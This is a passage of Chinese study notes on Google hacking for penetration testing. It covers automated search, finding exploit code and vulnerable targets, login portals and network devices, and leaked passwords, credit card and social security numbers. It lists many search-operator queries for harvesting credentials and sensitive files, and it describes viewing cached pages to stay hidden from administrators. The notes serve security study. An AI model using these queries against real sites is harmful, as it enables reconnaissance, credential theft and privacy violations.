<li><p>如果想要防止这方面的信息泄露，应该模拟一次信息的渗透测试来修改你不希望的出现的东西，甚至可以放一些文件来误导攻击者</p>
<ul>
<li>对于附录网站敏感信息或者绝对路径的文件，应该放在一些无法read的目录或隐藏</li>
</ul>
<p><strong>第五章 Google在信息收集框架中扮演的角色</strong></p>
<p><strong>5.1 简介</strong></p>
<ul>
<li>黑客实际上是一种心境以及一种思考方式，而不是一种物理属性</li>
</ul>
</li>
</ul>
<ol>
<li>因为他们想了解大多数人所不了解的<ol start="2">
<li>知识就是力量</li>
</ol>
</li>
</ol>
<p>  <strong>5.2 自动搜索原则</strong></p>
<ul>
<li>确定原始搜索关键字</li>
<li>扩展 搜索关键字</li>
<li>从数据源获取数据<ul>
<li>解析数据</li>
</ul>
</li>
<li>在后期过程中，将数据处理为信息</li>
</ul>
<p>  <strong>5.2.1 原始搜索关键字</strong></p>
<ul>
<li>清晰的定义目标大概算是所有搜索中最不相同的部分了，好的搜索不可能得到一个不清晰的目标。在进行自动化搜索时，手动搜索中的原则也同样适用：无用的信息输入，无用信息输出。</li>
</ul>
<p>  <strong>5.2.2 扩展搜索关键字</strong></p>
<ul>
<li>扩展搜索关键字是人类的天性，自动化搜索真正的本领就在于它能思考人类工作过程并且能够将改过程翻译成某种算法</li>
</ul>
<p>  <strong>（对于自动化查找则和字典相同去匹配各种邮箱来找到你所使用的东西）</strong></p>
<ol>
<li><p>E-mail地址</p>
</li>
<li><p>电话号码</p>
</li>
<li><p>人</p>
</li>
<li><p>获取大量结果</p>
<ol start="5">
<li>更多组合</li>
</ol>
</li>
<li><p>使用“特殊的”操作符</p>
<p>eg：</p>
</li>
</ol>
<ul>
<li>filetype:ppt site:www.****.gov</li>
<li>filetype:doc site:www.****.gov<ul>
<li>filetype:xls site:www.****.gov</li>
</ul>
</li>
<li>filetype:pdf site:www.****.gov</li>
</ul>
<p>  <strong>5.2.3 从数据源获取数据</strong></p>
<p>  <strong>1.自行抓取——请求并接受响应</strong></p>
<ul>
<li>这是获取结果的另一种灵活的方式。你完全可以控制整个过程，并且可以进行诸如设置结果数量这类工作——使用应用编程接口（Applocation Programming Interface, API）你一旦进行了该工作，你的顾虑就被完全打消了，并且会开始着手调节参数</li>
</ul>
<p>  <strong>NETCAT</strong></p>
<ul>
<li><strong>人们称Netcat是TCP/Internet Protocol (IP)的瑞士军刀。对于黑白两道而言，它都是一个极有的工具；从漏洞利用获取反解的shell（黑帽）到帮助网络管理员分析协议（白帽）。</strong></li>
</ul>
<p>  <strong>2. 自行抓取——解析结果</strong></p>
<ul>
<li>可以用netcat抓取结果并自动做结果解析</li>
</ul>
<p>  <strong>3.Dapper</strong></p>
<ul>
<li>Dapper站点（<strong><a href="http://www.dapper.net">www.dapper.net</a></strong>）支持用户创建一种他们称为Dapper的东西。这些Dapp是很小的程序，可以从任何站点抓取信息，并将这些抓取的数据以几乎任何一种方式传递 （例如，XML、CSV、RSS等）</li>
</ul>
<p>  <strong>4.Aura/EvilAPI</strong></p>
<ul>
<li>一种能拦截Google API调用并返回简单对象存取协议（Simple Object Access Protocol, SOAP） XML的应用程序——基于仍旧在使用的API的应用程序不需要进行任何改动。</li>
</ul>
<p>  <strong>5.使用其他搜索引擎</strong></p>
<ul>
<li>除了Google外，世界上还有很多搜索引擎！MSN引擎也支持API</li>
</ul>
<p>  <strong>API</strong>：API就是操作系统留给应用程序的一个调用接口，应用程序通过调用操作系统的 API 而使操作系统去执行应用程序的命令（动作）。</p>
<p>  <strong>5.2.4解析数据</strong></p>
<ol>
<li>解析E-mail地址<ol start="2">
<li>域和子域</li>
</ol>
</li>
<li>电话号码</li>
</ol>
<p>  <strong>5.2.5 后期处理</strong></p>
<ol>
<li>按相关性对结果进行分类<ol start="2">
<li>非摘要内容</li>
</ol>
</li>
<li>呈现结果</li>
</ol>
<p>  <strong>5.3 搜索关键字</strong></p>
<p>  <strong>5.3.1 在Web上收集</strong></p>
<ul>
<li>你可以从中搜索到其他人的搜索关键字的泄露站点会突然出现，一旦你找到了一些有趣的东西，你将会看到此人执行的所有的其他的搜索</li>
</ul>
<p>  <strong>5.3.2 自行收集</strong></p>
<ul>
<li>当你搜索某些资料时，查询都会定位到Google计算机。你每次在Google上执行搜索时，他们都会查看你是否通过了一个cookie。如果没有会指示你的浏览器设置一个 </li>
</ul>
<p>  <strong>//  然后可以使用burfsuite去搞一些事情</strong></p>
<ul>
<li><strong>隐藏 甜言蜜语：</strong> 假设你在运行一个代号为“Sookha”的超级机密项目。没有人知道这个项目的名称。如果某人想去Google上查找单词Sookha，那么你应该在不让搜索者察觉你所了解的事实情况下获知。<strong>你能做的就是注册一个使用Sookha作为关键字的关键字广告。</strong></li>
</ul>
<p>  <strong>5.4一些感想</strong></p>
<ul>
<li>应该建立一个自己的字典脚本来对于一些查询<ul>
<li>学习一些python脚本来为你的自动搜索做一些事情</li>
</ul>
</li>
<li>对于一个隐晦的不想让他人通过Google在搜索出来的东西可以以该名字作为一个广告的关键字</li>
</ul>
<p>  <strong>第六章 搜索漏洞利用与查找目标</strong></p>
<p>  <strong>6.1 简介</strong></p>
<ul>
<li>漏洞利用（exploit）代码时黑客使用的一种工具。他们设计用来洞察一个目标，大部分黑客都有许多可以随意支配的漏洞利用。而大部分的漏洞利用在某段时间内时不公开的，不过他们最终会公布，发布出来，而我们正式利用这一点来进行Google搜索 找到一些可以使用的和一些可以被攻击的目标</li>
</ul>
<p>  <strong>6.2搜索漏洞利用代码</strong></p>
<ul>
<li><p>可以通过关注那些常见的字符串，例如exploit或者vulnerablility，来搜索公开的漏洞利用站点。如果想让结果更为精确，可以给查询附上filetype操作符，以查询以特定程序设计语言所编写的漏洞利用  eg:    filetype:c c |  filetype:c exploit |  php</p>
<ul>
<li>即可以使用filetype指定文件扩展名，也可以使用源代码中的常见字符串，例如“include ”，来查找漏洞利用代码</li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5996.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5998.jpeg" alt="0"></p>
<p><strong>6.3 Google代码搜索</strong></p>
</li>
<li><p>Google代码搜索，可以用来搜索程序内部的代码，但是它也可以用来搜索导致漏洞的编程错误</p>
<ul>
<li>除了允许查询包括强大的正则表达式外，代码搜索还引入了特殊的搜索符，如下</li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6000.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6002.jpeg" alt="0"></p>
<p><strong>6.4 搜索恶意软件和可执行文件</strong></p>
</li>
<li><p>Google不止会抓取，还会分析二进制文件或者可执行文件</p>
<ul>
<li>Google的二进制搜索功能可以用来剖析可执行文件，但是它也可以用来搜索Web上的可用恶意软件</li>
</ul>
<p><strong>6.5 搜索易受攻击的目标</strong></p>
<ul>
<li>攻击者可以利用软件制造商提供的应用程序的演示程序中出现的字符串来搜索潜在的目标</li>
</ul>
</li>
<li><p>攻击者也可以下载并选择性安装易受攻击的产品，从而在应用程序显示的字符串中查找特殊的字符串</p>
<ul>
<li>不管字符串是如何获得的，它都能够很容易地转换成Google查询，彻底缩短了在公开漏洞公告之后，访问人员花在加固站点安全上的时间</li>
</ul>
<p><strong>6.5.1 利用演示页面搜索目标</strong></p>
<ul>
<li>通过演示页面来获取web对应的一些版本信息在来进行查询</li>
</ul>
<p><strong>6.5.2 利用源代码搜索目标</strong></p>
<ul>
<li>同样的原来在网页上下载对应的网站源代码来找到网站的信息，针对各种信息在做出对应的查询</li>
</ul>
<p><strong>6.5.3 利用CGI扫描搜索目标</strong></p>
</li>
<li><p>利用CGI扫描器    一个CGI扫描器可以在一个数据文件中列出易受攻击的文件和目录</p>
<ul>
<li>eg： inurl:/cgi-bin/userreg.cgi        |    filetype:cgi inurl:userreg.cgi</li>
</ul>
<p>​    </p>
<p><strong>6.6 网站链接</strong></p>
<ul>
<li><a href="http://www.sensepost.com/research/wikto/">www.sensepost.com/research/wikto/</a>    Wikto,一个很棒的Google和web扫描器</li>
</ul>
</li>
<li><p><a href="http://www.cirt.net/code/nikto.shtml">www.cirt.net/code/nikto.shtml</a> Nikto, 一很棒的Web扫描器</p>
<ul>
<li><a href="http://packetstormsecurity.com">http://packetstormsecurity.com</a>    一个很棒的工具和漏洞利用站点</li>
</ul>
<p><strong>6.10 一些想法</strong></p>
<ul>
<li>这是因为它能够使用strip=1参数来显示缓存页面</li>
</ul>
<p><strong>第7章 简单有效的安全性搜索</strong></p>
<p><strong>7.1 简介</strong></p>
<ul>
<li>针对安全方面的工作而言，我们来看看在安全性评估中相当有效的10个搜索，但这仅仅是作为你的前10位列表的基础。</li>
</ul>
<p><strong>7.1.1 site</strong></p>
<ul>
<li>site操作符擅长从Google所收集的内容中提取与目标有关的信息</li>
<li>这个操作符常用于和其他本章中提到的查询组合使用，以对某一目标实现精确搜索</li>
</ul>
</li>
<li><p>site搜索也可以用来收集关于目标主机或服务器的信息</p>
<ul>
<li>eg：        <strong>site:nytimes.com-site:**</strong><a href="http://www.nytimes.com">www.nytimes.com</a>**</li>
</ul>
<p><strong>7.1.2 intitle:index.of</strong> </p>
</li>
<li><p>针对<strong>Apache</strong>风格的目录列表的通用搜索</p>
<ul>
<li>目录列表能够给攻击者提供又价值的信息</li>
</ul>
<p><strong>7.1.3 error | warning</strong></p>
<ul>
<li><strong>(“for more information” | “not found”) (error | warning)</strong> 查询就返回了很多条有趣的结果</li>
</ul>
</li>
<li><p>错误消息在每种坏境下都会泄露出很多信息</p>
<ul>
<li>在某些情况下，警告文本能够提供目标所使用的代码内部的重要信息</li>
</ul>
<p><strong>7.1.4 login | logon</strong></p>
<ul>
<li>登陆 <strong>(login)</strong> 入口就是一个网站的”前门” 可以查询出来</li>
</ul>
</li>
<li><p>这个查询可以高效地搜索出登陆人口</p>
<ul>
<li>它也可以用来获取用户名以及解决问题的步骤</li>
</ul>
<p><strong>7.1.5 username | userid | employee.ID | “your username is”</strong></p>
<ul>
<li>有许多不同的方法用来从一个目标系统中获取用户名，即使在大多数的认证机制中，用户名都是不太重要的一半，但是至少应对它进行最低限度的保护，以防止外人获取</li>
</ul>
</li>
<li><p><strong>一种获取用户名的最通用的搜索</strong></p>
<ul>
<li>当这个查询不能获取用户名时，其周围的上下文也能泄露攻击者可以用于后续攻击行为的信息</li>
</ul>
<p><strong>7.1.6 passworl | passcode | “your passcode is”</strong></p>
<ul>
<li>这个查询反映了<strong>password</strong>的常见的方法</li>
</ul>
</li>
<li><p>这个查询能够泄露描述登陆步骤、口令修改步骤以及目标所用的口令策略的文档。对于搜索有关电话会议的信息而言，特别是在<strong>Google</strong>日历搜索中，<strong>passcode</strong>特别有用</p>
<ul>
<li>一般性的搜索是没有什么用的但是如果加上site搜索就变得不寻常了</li>
</ul>
<p><strong>7.1.7 admin | administrator</strong></p>
<ul>
<li>该查询用两个最常用的术语来表示网站的所有者或者维护者，可以用来暴露程序上的信息(例如”contact your administrator”)，甚至是管理登陆入口</li>
</ul>
<p><strong>7.1.8 -ext”:html -ext:html -ext:shtml -ext:asp -ext:php</strong></p>
</li>
<li><p>当把这个查询和site操作符组合使用时，能够剔除最常见的文件，而暴露更有趣的文档</p>
<ul>
<li>该查询也可以针对不同的目标而作相应的修改以剔除其他的常见文件累心</li>
</ul>
<p><strong>7.1.9 inurl:temp | inurl:tmp | inurl:backup | inurl:bak</strong></p>
<ul>
<li>查询也可以针对不同的目标而作相应的修改以剔除其他的常见文件，而暴露出更有趣的文档</li>
</ul>
<p><strong>7.1.10 intranet | help.desk</strong></p>
<ul>
<li>这个查询用来搜索内部网络站点（这些站点应该收到保护以防止外部人员访问）以及服务台联系信息和操作步骤</li>
</ul>
<p><strong>7.2 一些想法</strong></p>
<ul>
<li>规模较大的查询列表中的大多数搜索都是非常特殊的，它们只针对很少的一部分互联网站点。虽然这些特殊查询的效果极佳，但是一般最好还是保存一个规模较小的强大的搜索列表，以在评估中灵活地创造出丰富的搜索，尤其是当你用常规方法感到无计可施时更为有用</li>
</ul>
<p><strong>第8章 跟踪搜索Web服务器、登陆入口和网络硬件</strong></p>
<p><strong>8.1 简介</strong></p>
<ul>
<li>通常认为，渗透测试人员也是专业的黑客，因为它们本质上通过攻入客户的网路来查找、记录并且最终帮助客户解决系统或者网络中的安全缺陷的</li>
</ul>
<p><strong>8.2 定位并分析Web服务器</strong></p>
<ul>
<li>目录列表和默认的服务器生产的错误消息可以提供一些关于服务器的信息。即使这些信息可以通过直接连接到服务器来得到，但是一名拥有针对特定版本的软件的漏洞利用程序的攻击者会使用Google查询来搜索相应的目标，而这些Google查询都是针对这类信息设计的</li>
<li>攻击者尤其会关注操作系统，Web服务器软件的版本和名称、默认的配置，有漏洞的脚本，或者这些因素的任意组合</li>
</ul>
</li>
<li><p>Google查询更为隐蔽而且也给攻击者和目标之前提供了某种程度的隔离</p>
<ul>
<li>服务器和应用程序错误消息暴露了大量的信息，从软件的版本和补丁级别到源代码片段以及关于系统进程和程序的信息，错误消息是最被低估的信息泄露途径之一</li>
</ul>
<p><strong>8.2.1 目录列表</strong></p>
<ul>
<li>对与服务器的目录列表的程序“server at “Apache/2.0.52” ” 查找具有Apache 2.0.52 server标记的目录列表的服务器</li>
</ul>
<p><strong>8.2.2 Web服务器软件的错误信息</strong></p>
<ul>
<li>对于Microsoft IIS 默认情况下在IIS 5和IIS 6在服务器遇到某种问题时，会显示相应的静态的HTTP/1.1错误消息，这些错误页面默认保存在%SYSTEMROOT%\help\iishelp\common目录</li>
</ul>
</li>
<li><p>对于服务器报错，搜一些错误信息 httpd.conf        bottom.html</p>
<ul>
<li>可以使用一些基本的shell命令，我们就能吧错误页面的标题与可能出现在错误页面上的文本分离出来        <strong>//grep -h -r “Content-language: en” -A 10 | grep -A5 “TITLE” | grep -v virtual</strong></li>
</ul>
<p><strong>8.2.3 应用软件错误消息</strong></p>
</li>
<li><p>查询”Fatal error: Call to undefined function” -reply -the -next 能查找到ASP错误消息</p>
<ul>
<li>查询 intext: “warning: Failed opening “ include_path 可以找到一些常见的错误，许多错误都会泄露路径名和文件名</li>
</ul>
<p><strong>8.2.4 默认页面</strong></p>
</li>
<li><p>查找特殊类型的服务器或者Web软件的方法时搜索默认的Web页面。大多数的软件，包括Web服务器软件自身，都带有一个或多个默认或测试页面。这些页面可以让管理员方便地测试Web服务器或者应用程序的安装。</p>
<ul>
<li><strong>一些查找特定服务器的查询</strong></li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6832.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6830.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6833.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6831.png" alt="0"></p>
</li>
</ul>
<p>  <strong>8.2.5 默认文档</strong></p>
<ul>
<li><p>Web服务器软件通常会附带一些手册和文档，它们位于Web目录中。攻击者可以利用这种文档对Web软件进行剖析或者搜索。</p>
<ul>
<li>大部分一些文档会透露着一些服务器什么的默认设置甚至一些管理员的默认账户密码</li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6884.png" alt="0"></p>
<p><strong>8.2.6 示例程序</strong></p>
</li>
<li><p>Web软件除了附带文档和手册之外，一个软件包通常还包含一些默认的应用程序。这些默认的应用程序，例如默认的Web页面，可以帮助演示软件的功能，作为开发者的起点，提供可以用作学习工具的实例函数和代码。</p>
<ul>
<li>例如Microsoft Index Server的内容查找可以允许Web访问者搜索整个网站的内容。在某些情况下，这个查询页面能够查找到没有被其他任何页面链接的页面或者包含敏感信息的页面</li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6902.png" alt="0"></p>
</li>
<li><h2 id="你可以使用这些缓存页面与-amp-strip-1选项一道来匿名查看页面，这可以让信息收集工作远离服务器管理员的监视"><a href="#你可以使用这些缓存页面与-amp-strip-1选项一道来匿名查看页面，这可以让信息收集工作远离服务器管理员的监视" class="headerlink" title="你可以使用这些缓存页面与&amp;strip=1选项一道来匿名查看页面，这可以让信息收集工作远离服务器管理员的监视"></a>你可以使用这些缓存页面与&amp;strip=1选项一道来匿名查看页面，这可以让信息收集工作远离服务器管理员的监视</h2><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6911.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6915.png" alt="0"></p>
<p><strong>8.3 定位登陆入口</strong></p>
</li>
<li><p>登陆入口会吸引那些正搜索特定类型软件的攻击者。另外，登陆入口也可以作为信息收集攻击的起点。因为大多数登陆入口都是设计成对用户友好的，给新用户提供帮助文档和操作步骤的链接。管理登陆入口和远程股管理工具有时更加危险，尤其是当它们没有被正确的配置时</p>
<ul>
<li>一些登陆入口，类似allinurl:” exchange/logon.asp” 可能会提供大量关于服务器的信息</li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6938.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6942.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6944.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6947.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6949.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6951.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6954.png" alt="0"></p>
<p><strong>使用并且查找各种Web工具</strong></p>
</li>
<li><p>虽然Google强大且灵活，但它并不是无所不能的。有时候，如果不用Google反而更简单。当不使用Google来执行类似与WHOIS查询，“pings”，traceroute以及端口扫描等任务时，更为简单方便。</p>
<ul>
<li>NQT网络查询工具（Network Query Tool）。<a href="http://www.shipmail.gr/index.php">http://www.shipmail.gr/index.php</a></li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6978.png" alt="0"></p>
<ul>
<li>默认的NQT安装允许任何网络用户执行IP主机名和地址查询，DNS查询，WHOIS查询，端口测试与traceroute。NQT是一个基于Web的程序，意思是说任何能够访问该页面的用户都可以对任意目标执行这些功能。器服务器会掩盖用户的真实地址。如果使用一个匿名代理服务器，则可以进一步的隐藏用户的真实身份        //NQT程序也打接受远程的POST请求</li>
</ul>
<p><strong>8.4 瞄准使用Web的网络设备</strong></p>
</li>
<li><p>各种网络设备都可以用Google查询搜索到。对某些攻击者而言，这些设备不仅知识满足他们技术上的好奇，许多由Web链接了的设备配置不当，而且安全审计人员通常会忽视那些可信的设备。网络摄像头就是一种被忽视的设备，它能够给攻击者提供目标的内部情况，即使只有相当少的一部分目标安装了网络摄像头。当网络打印机被攻陷时，会泄露大量的敏感信息，尤其是对攻击者而言，他们可以查看打印作业和网络信息。</p>
<ul>
<li>许多网络设备都预安装一个Web接口以雨荨管理员查询设备的状态或者通过Web浏览器来改变设备的设置</li>
</ul>
<p><strong>8.5 查找各种网络报告</strong></p>
</li>
<li><p>网络文档和状态报告，它们能够让外部人员访问所有的信息，从网络上的IP地址到完整的，可用的网络图表    </p>
<ul>
<li>来自这些信息可以用来帮助创建网络映射</li>
</ul>
<p><strong>8.6 查找网络硬件</strong></p>
<ul>
<li>一个连接到网络的设备通常都具有某种Web页面。如果该设备连接到了互联网上，斌且曾经在一个到该设备的Web页面的链接，那么很有可能该页面存在于Google的数据库之中，等待某个灵巧的查询找到它</li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/7046.png" alt="0"></p>
<p><strong>8.7 总结即一些感想</strong></p>
<ul>
<li>攻击者使用Google由多种目的。攻击者可能拥有一个针对某个Web软件特定版本的漏洞利用程序</li>
<li>目录列表可以提供设备上所用的软件版本信息。</li>
<li>服务器报错也会泄露大量的信息</li>
</ul>
</li>
<li><p>登陆入口也是攻击的一个手段</p>
<ul>
<li>总的来说还是一个固定不变的思想有输入就有攻击，你有反应我就可以作事情，查询一些以有的东西来帮助我做一些事情</li>
</ul>
<p><strong>第九章 用户名、口令和其他秘密信息</strong></p>
<p><strong>9.1 简介</strong></p>
<ul>
<li>这一章的内容不是关于在评估过程中查找敏感数据的，而是关于为了搜索这些数据，那些“坏人”可能会做什么。这一章所提到的例子通常都代表了最常见的安全问题。黑客在每次攻击时都要瞄准这些信息。为了对抗这类攻击者。我们必须十分明确这种攻击会造成的最坏的可能。但是，我们也不用过于了解这些最坏的可能。请不要告诉那些有坏信息的人一些他们尚不知道的观念</li>
</ul>
<p><strong>9.2搜索用户名</strong></p>
<ul>
<li>大多数认证系统都是使用用户名和口令来保护信息。为了达到突破这类保护的“前门”的目的，你需要判断用户以及口令。</li>
<li>能够在许多地方找到用户名，某些时候，可能需要挖掘文档或E-mail目录</li>
</ul>
</li>
<li><p>一个想“your username is” 这样简单的查询都能有效地搜索用户名</p>
<ul>
<li>在一些帮助文档中包括了一些默认的用户和密码</li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/7108.png" alt="0"></p>
<ul>
<li>搜索已知的文件名来查找是否存在信息</li>
</ul>
</li>
<li><p>在Windows注册表保存了各种认证信息，包括用户名和口令，虽然不可能（很少）在Web中搜索到可用的，导出了的Windows注册表文件，但是这都是一种思想</p>
<ul>
<li>可以在公共目录中查找多次，最终会得到接近于包含所有用户信息的列表</li>
</ul>
<p><strong>9.3搜索口令</strong></p>
<ul>
<li>口令数据是渗透测试中的“圣杯”之一，它应该收到保护。遗憾的是。有许多可以用来在网络上搜索口令查询Google查询的例子</li>
</ul>
</li>
<li><p>一个类似于“Your password” forgot这样简单的查询能够找到提供忘记口令回复机制的页面</p>
<ul>
<li>intext:(password | passcod | pass) intext:(username | userid | user)是另外一种针对口令信息的通用搜索 </li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/7137.png" alt="0"></p>
<ul>
<li>下面是各种语言password的翻译文</li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/7142.png" alt="0"></p>
<p><strong>9.4 搜索信用卡账号和社保号码等</strong></p>
<ul>
<li>随着互联网上不可靠的零售商越来越多，出现如此多的信用卡欺骗现象也就没有什么可奇怪的了。并不是只有这些小规模的零售商会受到黑客的攻击。这些年来，成败上千个大新企业的财务数据库也受到了攻击，有些受害公司还是技术比较好并且也非常主义防止攻击的公司</li>
</ul>
</li>
<li><p>大多书情况下，包含这些账号的页面都不是从在线零售商或者电子商务网站”泄露出去的“，而很有可能是网络钓鱼欺骗结果。网络钓鱼欺骗是通过电话或者E-mail欺骗用户的个人信息</p>
<ul>
<li>甚至一些不负责任的新闻渠道泄漏了能够查找这些信息的功能查询，还可以通过搜索特定的文件扩展名来查找</li>
</ul>
<p><strong>9.4.1 社保账号</strong></p>
<ul>
<li>社保号码和其他铭感数据也可以很容易地通过Google查找到，所用的技术和搜索信用卡账号的技术相同</li>
</ul>
<p><strong>9.4.2 个人财务数据</strong></p>
<ul>
<li>在某些情况下，公布个人消息的责任在于钓鱼欺骗，在其他一些情况下，侵犯个人隐私就要归咎于那写攻击网上零售商的黑客了。随这当今社会个人电脑数量的快速增长，差不多有上百种个人财务程序供用户选择使用。许多这种程序都会创建带有特定文件扩展名的数据文件</li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/7185.png" alt="0"></p>
<p><strong>9.5搜索其他有利可图的信息</strong></p>
<ul>
<li>Google能找到的但是很难归类的数据。这些数据包括地址簿、聊天日志文件、以及网络漏洞报告等，这些网上的敏感数据都是很有价值的。</li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/7194.png" alt="0"></p>
<ul>
<li>Nessus安全扫描工具的输出。Nessus可以在<a href="http://www.nessus.org上获得。这个很棒的开源工具能够对目标执行一系列的安全测试，并报告各种可能的漏洞">www.nessus.org上获得。这个很棒的开源工具能够对目标执行一系列的安全测试，并报告各种可能的漏洞</a></li>
</ul>
<p><strong>9.6 总结</strong></p>
</li>
<li><p>不要犯任何错误，因为在网上存在各种敏感的数据，而且Google能够找到这些数据。除非你能够给出恰当的查询，否则可搜索的信息机会没有任何限制。用户名、口令、信用卡账号、社保号码和个人财务数据这些信息都在可搜索的范围内。</p>
<ul>
<li>一个泄露的口令就能够提供关于用于其他系统上的口令的线索。大多数策略都进制这种口令共享，但是这种限制通常很难执行</li>
</ul>
<p><strong>第十章 hacking Google 服务</strong></p>
<p><strong>10.1 AJAX Search API</strong></p>
</li>
<li><p>AJAX Search API是AJAX前端的主要的Google服务。该项服务有意取代旧的SOAP搜索服务，而SOAP搜索服务的支持在不久前已经被废止了。AJAX Search API被认为是比SOAP服务更强大的一个服务，并且更容易使用。</p>
<ul>
<li>该服务的主要目标是使外部网能够寄存Google供给的技术，这些技术提供了位域寄存在Web站点内、外的搜索工具，并且可以是视频剪辑、地图、博客、自定义搜索引擎等等中的一个</li>
</ul>
<p><strong>10.1.1 嵌入式Google AJAX Search API</strong></p>
<ul>
<li>Google AJAX Search API 设计为嵌入到外部页内。这使得服务箱单更有用，因为我们可以指导自定义界面来获得更好的对Google底层结构的访问。为了着手启用Google AJAX Search API 你需要理解JavaScrippt和AJAX编程以及你要自行生成的API密钥。</li>
</ul>
</li>
<li><p>XSS和AJAX蠕虫</p>
<ul>
<li>该技术可以通过XSS/AJAX蠕虫来实现目标搜索并且利用目标来获取有用的信息，因此要确保将来的繁殖。XSS/AJAX蠕虫通常都在源域中繁殖和传播。这是因为JavaScript没有执行跨站点请求的能力。本章提到的该技术语序蠕虫绕过JacaScript的限制，并且可以访问在线的其他资源</li>
</ul>
<p><strong>10.2 Calendar</strong></p>
<ul>
<li>Google calendar 是一个功能强大的日历管理应用程序，它支持类似日历共享、邀请创建、搜索以及日历发布。该服务也可以于Google Mail （Gmail）结合起来，并且可以通过移动设备来访问。</li>
<li>因为单个用户可以维护其他用户可能更也很感兴趣的时间列表以及入理。所以calendar共享是一个非常有用的功能。</li>
</ul>
</li>
<li><p>共享的日历，通常。甚至是执行那些最基本的搜索时，都完全有可能无意间发现那些可以执行恶意目的的铭感信息</p>
<ul>
<li>例如泄露了几个预定的电话会议。注意，会议电话号码和访问代码也列了出来，你可通过对于会议的秘密听取来获得你想要的信息，或者用一些简单的账户密码的搜索来找到一些你想要的信息</li>
</ul>
<p><strong>10.3 Blogger和Google的Blog Search</strong></p>
</li>
<li><p>Blogger时Google的博客软件，它位于blogger。com和blogspot。com之上。Blogger是使用得最广泛的博客之一。他允许多个博客实时创建，并且具有一些与其他软件合作并且避免注释和引用垃圾博客的功能</p>
<ul>
<li>Splog的搜索引擎的排名在不断地提升，所以他会吸引更多的访问者。如果攻击者拿下了Web浏览器的Splog页面上的漏洞应用的话，他就应该在瞬间接管上百台机器</li>
</ul>
<p><strong>10.4 信号报警</strong></p>
<ul>
<li>google alerts是一个强大的工具，可以用来发觉查询结果合适变化。该系统可以被修改为每天或者每周都发送更新，亦或者是有更新时发送更新</li>
<li>这是一个很出色的工具，它还可以用于更有趣的目的。假设、我们知道目标服务器使用Mysql作为数据库终端。我们可以使用Google Alerts 来查询目标，并且在出现错误时搜索错误信息</li>
</ul>
</li>
<li><p>为警报类型选择Web—通常这是默认的选项。选项警报的频率以及你的E-mail地址并且单击Create Alert（创建警报）</p>
<ul>
<li>恶意用户可以使用该服务来警示目标站点上出现的漏洞和有趣信息。这个警示的配置非常低，并不会让目标有所警惕，该业务发生在用户和Google之间。攻击者甚至可以碰到Google Hacking Database中所有条目的警报。</li>
</ul>
<p><strong>10.5 Google Co-op</strong></p>
<ul>
<li>Google Co-op（<a href="http://www.google.com/coop）是一个非常强大的服务，允许你创建一个强大的自定义搜索引擎。你不需要为了使用该服务而注册为Google用户，但是如果你需要创建一个引擎，则需要注册">www.google.com/coop）是一个非常强大的服务，允许你创建一个强大的自定义搜索引擎。你不需要为了使用该服务而注册为Google用户，但是如果你需要创建一个引擎，则需要注册</a></li>
</ul>
<p><strong>10.6 Google Code</strong></p>
</li>
<li><p>Google Code是对允许提供全免费项目的开源代码社区的最大的恩惠。在功能方面，该服务与很多人都知道的Sourceforge十分相似。通过SVN，为研发者提供了Wiki来寄存项目文档、Bug跟踪体系以及版本控制</p>
<ul>
<li>Google Code不只是一个开发环境，他还是一个免费的寄存提供者。我们可以使用该系统来隐藏此处的所有信息</li>
</ul>
<p><strong>10.6.1 SVN简介</strong></p>
<p><strong>10.6.2 在线获取文件</strong></p>
<ul>
<li>一旦你的项目提交到源库中，你便可以在线访问它的内容。你可以通过访问<a href="http://projectname.googlecode.com/svn/trunk来获取提交的项目。记住，提交的文件可以作为内容形式的文件/明码或者内容形式的应用程序/八位字节流使用，这样一来便可以防止它们在浏览器中被解析。这意味着，理论上，你应该能查看/预览上传的图片或者HTML文件">http://projectname.googlecode.com/svn/trunk来获取提交的项目。记住，提交的文件可以作为内容形式的文件/明码或者内容形式的应用程序/八位字节流使用，这样一来便可以防止它们在浏览器中被解析。这意味着，理论上，你应该能查看/预览上传的图片或者HTML文件</a></li>
</ul>
</li>
